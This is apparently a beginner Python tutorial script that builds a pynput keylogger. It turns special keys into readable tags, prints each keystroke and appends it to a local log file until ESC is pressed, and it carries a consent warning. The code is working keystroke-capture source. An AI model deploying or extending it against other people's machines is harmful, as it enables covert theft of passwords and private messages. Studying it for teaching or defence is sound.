# keylogger tutorial 2
# We are going to make our key logger a little bit better by removing the single quotes (' ') from the keys and also handling the special keys like shift,space, ctrl, alt, etc.
'''
Using multiple if statements like in the previous tutorial for special keys can be inefficient and harder to manage. 
A better way is to use a dictionary to map special keys to human-readable values. 
This makes the code cleaner, faster, and easier to update.
'''

'''❌ Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

from pynput import keyboard  # Import the keyboard module from the pynput library

# Dictionary mapping special keys to readable text
SPECIAL_KEYS = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "\t",
    "Key.backspace": "[BACKSPACE]",
    "Key.shift": "[SHIFT]",
    "Key.shift_r": "[SHIFT]",
    "Key.ctrl": "[CTRL]",
    "Key.ctrl_r": "[CTRL]",
    "Key.alt": "[ALT]",
    "Key.alt_r": "[ALT]",
    "Key.esc": "[ESC]",
    "Key.caps_lock": "[CAPSLOCK]",
    "Key.num_lock": "[NUMLOCK]",
    "Key.scroll_lock": "[SCROLLLOCK]",
    "Key.delete": "[DELETE]",
    "Key.insert": "[INSERT]",
    "Key.home": "[HOME]",
    "Key.end": "[END]",
    "Key.page_up": "[PAGEUP]",
    "Key.page_down": "[PAGEDOWN]",
    "Key.up": "[UP]",
    "Key.down": "[DOWN]",
    "Key.left": "[LEFT]",
    "Key.right": "[RIGHT]",
    "Key.f1": "[F1]",
    "Key.f2": "[F2]",
    "Key.f3": "[F3]",
    "Key.f4": "[F4]",
    "Key.f5": "[F5]",
    "Key.f6": "[F6]",
    "Key.f7": "[F7]",
    "Key.f8": "[F8]",
    "Key.f9": "[F9]",
    "Key.f10": "[F10]",
    "Key.f11": "[F11]",
    "Key.f12": "[F12]",
}

def keyPressed(key):
    #### Function to log keypresses in a human-readable format.####
    text = str(key).replace("'", "")  # Remove single quotes for regular keys
    
    # Check if the key is in the special keys dictionary
    text = SPECIAL_KEYS.get(text, text)  

    print(text)  # Print the formatted key

    # Append the formatted key to a log file
    with open("keylog_1.txt", "a") as file:  # creates a file called keylog_1.txt in the same directory as the script
        file.write(text) # write the formatted key to the file

    # Stop when 'ESC' is pressed
    if key == keyboard.Key.esc:
        print("\nESC key detected. Stopping the keylogger...")
        listener.stop()

# Start the listener
listener = keyboard.Listener(on_press=keyPressed)
listener.start()
listener.join()  # Keeps the program running until ESC is pressed

print("Keylogger stopped.")

# when you run the code you will see the keys you press in the terminal and also in the keylog_1.txt file.
# Also notice that the although the special keys are more readable, they are still create a lot of noise in the log file.
# We will work on removing the noise in the next tutorial.